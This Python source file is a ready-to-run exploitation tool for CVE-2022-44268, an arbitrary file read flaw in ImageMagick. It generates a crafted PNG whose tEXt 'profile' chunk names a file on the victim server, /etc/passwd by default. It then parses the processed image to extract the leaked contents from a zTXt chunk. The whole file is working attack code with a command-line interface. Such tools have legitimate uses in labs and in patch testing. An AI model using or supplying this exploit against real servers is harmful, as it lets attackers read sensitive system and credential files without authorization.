#!/usr/bin/env python3

"""
CVE-2022-44268 ImageMagick Exploitation Tool

A tool to generate malicious PNG files and parse the results for the 
ImageMagick arbitrary file read vulnerability.

Reference: https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268
"""

import sys
import png
import zlib
import argparse
import binascii
import logging
from pathlib import Path
from typing import Optional, Tuple


class CVE202244268Exploit:
    """Handler for CVE-2022-44268 ImageMagick exploit operations."""
    
    # Default PNG chunks for minimal valid PNG
    DEFAULT_IHDR = (
        b'\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00'
    )
    DEFAULT_IDAT = (
        b'x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xff'
        b'm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9\xef\xee'
        b'])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80'
        b'\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0\xccb\x8cf\x06'
        b'`gwgf\x11afw\x7fx\x01^K+F'
    )

    def __init__(self):
        self.decompressor = zlib.decompressobj()
        self.logger = self._setup_logger()

    def _setup_logger(self) -> logging.Logger:
        """Configure and return logger instance."""
        logger = logging.getLogger(__name__)
        if not logger.handlers:
            handler = logging.StreamHandler(sys.stderr)
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    def _parse_ztxt_data(self, data: bytes) -> str:
        """Parse zTXt chunk data to extract readable content."""
        try:
            _, hex_data = data.strip().split(b'\n', 1)
            clean_hex = hex_data.replace(b'\n', b'')
            return binascii.unhexlify(clean_hex).decode('utf-8', errors='ignore')
        except (ValueError, UnicodeDecodeError) as e:
            self.logger.error(f"Failed to parse zTXt data: {e}")
            return ""

    def parse_png(self, filename: str) -> Optional[str]:
        """
        Parse PNG file and extract leaked file content from zTXt chunks.
        
        Args:
            filename: Path to PNG file to parse
            
        Returns:
            Extracted file content or None if not found
        """
        if not filename:
            self.logger.error('Input filename is required')
            return None

        file_path = Path(filename)
        if not file_path.exists():
            self.logger.error(f'File not found: {filename}')
            return None

        try:
            reader = png.Reader(filename=filename)
            
            for chunk_type, chunk_data in reader.chunks():
                chunk_name = chunk_type.decode('ascii', errors='ignore')
                self.logger.info(f"Found chunk: {chunk_name}")
                
                if chunk_type == b'zTXt':
                    try:
                        name, compressed_data = chunk_data.split(b'\x00', 1)
                        decompressed = self.decompressor.decompress(
                            compressed_data[1:]
                        )
                        return self._parse_ztxt_data(decompressed)
                    except (ValueError, zlib.error) as e:
                        self.logger.error(f"Failed to process zTXt chunk: {e}")
                        
        except Exception as e:
            self.logger.error(f"Failed to read PNG file: {e}")
            return None

        self.logger.warning("No exploitable zTXt chunks found")
        return None

    def generate_malicious_png(
        self, 
        output_file: str, 
        target_file: str = '/etc/passwd',
        base_png: Optional[str] = None
    ) -> bool:
        """
        Generate malicious PNG file with embedded file read request.
        
        Args:
            output_file: Path for output PNG file
            target_file: Target file to read on victim system
            base_png: Optional base PNG file to use instead of minimal PNG
            
        Returns:
            True if successful, False otherwise
        """
        if not output_file:
            self.logger.error('Output filename is required')
            return False

        try:
            with open(output_file, 'wb') as f:
                f.write(png.signature)
                
                # Use existing PNG as base or create minimal PNG
                if base_png and Path(base_png).exists():
                    self._copy_base_chunks(f, base_png)
                else:
                    self._write_minimal_png_chunks(f)
                
                # Add malicious tEXt chunk
                profile_data = b"profile\x00" + target_file.encode('utf-8')
                png.write_chunk(f, b"tEXt", profile_data)
                png.write_chunk(f, b'IEND', b'')
                
            self.logger.info(
                f"Generated malicious PNG: {output_file} "
                f"(target: {target_file})"
            )
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to generate PNG: {e}")
            return False

    def _copy_base_chunks(self, output_file, base_png: str) -> None:
        """Copy chunks from base PNG, excluding IEND."""
        reader = png.Reader(filename=base_png)
        for chunk_type, chunk_data in reader.chunks():
            if chunk_type != b'IEND':
                png.write_chunk(output_file, chunk_type, chunk_data)

    def _write_minimal_png_chunks(self, output_file) -> None:
        """Write minimal PNG chunks for a valid PNG file."""
        png.write_chunk(output_file, b'IHDR', self.DEFAULT_IHDR)
        png.write_chunk(output_file, b'IDAT', self.DEFAULT_IDAT)


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='CVE-2022-44268 ImageMagick exploitation tool',
        epilog='Examples:\n'
               '  %(prog)s generate -o malicious.png -r /etc/passwd\n'
               '  %(prog)s parse -i result.png',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        'action', 
        choices=['generate', 'parse'],
        help='Action to perform'
    )
    parser.add_argument(
        '-i', '--input', 
        help='Input PNG file (for parse action or base PNG for generate)'
    )
    parser.add_argument(
        '-o', '--output', 
        help='Output PNG file (for generate action)'
    )
    parser.add_argument(
        '-r', '--read', 
        default='/etc/passwd',
        help='Target file to read (default: /etc/passwd)'
    )
    parser.add_argument(
        '-v', '--verbose', 
        action='store_true',
        help='Enable verbose logging'
    )
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    exploit = CVE202244268Exploit()
    
    if args.action == 'generate':
        success = exploit.generate_malicious_png(
            args.output, 
            args.read, 
            args.input
        )
        sys.exit(0 if success else 1)
        
    elif args.action == 'parse':
        result = exploit.parse_png(args.input)
        if result:
            sys.stdout.write(result)
            sys.stdout.flush()
            sys.exit(0)
        else:
            sys.exit(1)


if __name__ == '__main__':
    main()
